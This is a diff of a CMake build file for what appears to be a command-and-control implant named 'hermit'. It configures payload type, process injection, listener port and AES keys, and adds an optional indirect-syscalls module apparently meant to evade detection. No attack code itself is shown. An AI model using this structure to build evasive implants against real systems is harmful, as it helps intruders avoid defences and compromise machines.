@@ -22,7 +22,7 @@ set(CMAKE_CXX_FLAGS "-municode -Os -s \
 # INCLUDE
 include_directories(include)
 
-# DEFINE
+# MACROS
 add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
 add_compile_definitions(PAYLOAD_TECHNIQUE=${PAYLOAD_TECHNIQUE})
 add_compile_definitions(PAYLOAD_PROCESS_TO_INJECT=${PAYLOAD_PROCESS_TO_INJECT})
@@ -32,9 +32,16 @@ add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
 add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
 add_compile_definitions(AES_KEY_BASE64=${AES_KEY_BASE64})
 add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})
+if(${PAYLOAD_INDIRECT_SYSCALLS} STREQUAL "true")
+    add_compile_definitions(PAYLOAD_INDIRECT_SYSCALLS=${PAYLOAD_INDIRECT_SYSCALLS})
+endif()
 
-# SOURCE
-set(COMMON_SOURCES
+# SOURCES
+set(SOURCE_ASM
+        ${ASM_OBJECT}
+)
+
+set(SOURCE_CORE
         src/hermit.cpp
         src/core/crypt.cpp
         src/core/procs.cpp
@@ -43,19 +50,21 @@ set(COMMON_SOURCES
         src/core/handler.cpp
         src/core/state.cpp
         src/core/stdout.cpp
+        src/core/syscalls.cpp
         src/core/system/arch.cpp
         src/core/system/env.cpp
         src/core/system/fs.cpp
+        src/core/system/handle.cpp
         src/core/system/http.cpp
         src/core/system/process.cpp
         src/core/utils/convert.cpp
 )
 if(${PAYLOAD_TYPE} STREQUAL \"dll\")
-    set(SOURCE src/main/dll_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
+    set(SOURCE_MAIN src/main/dll_loader_${PAYLOAD_FORMAT}.cpp)
 elseif(${PAYLOAD_TYPE} STREQUAL \"exec\")
-    set(SOURCE src/main/exec_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
+    set(SOURCE_MAIN src/main/exec_loader_${PAYLOAD_FORMAT}.cpp)
 elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode\")
-    set(SOURCE src/main/shellcode_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
+    set(SOURCE_MAIN src/main/shellcode_loader_${PAYLOAD_FORMAT}.cpp)
 endif()
 
 # LINK LIBRATILIES
@@ -63,7 +72,7 @@ link_libraries(bcrypt crypt32 winhttp wsock32)
 
 # ADD
 if(${PAYLOAD_FORMAT} STREQUAL "dll")
-    add_library(${PROJECT_NAME} SHARED ${SOURCE})
+    add_library(${PROJECT_NAME} SHARED ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
     set_target_properties(${PROJECT_NAME}
         PROPERTIES
             LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
@@ -72,7 +81,7 @@ if(${PAYLOAD_FORMAT} STREQUAL "dll")
     )
     add_definitions(-DIS_DLL)
 elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
-    add_executable(${PROJECT_NAME} WIN32 ${SOURCE})
+    add_executable(${PROJECT_NAME} WIN32 ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
     set_target_properties(${PROJECT_NAME}
         PROPERTIES
             RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
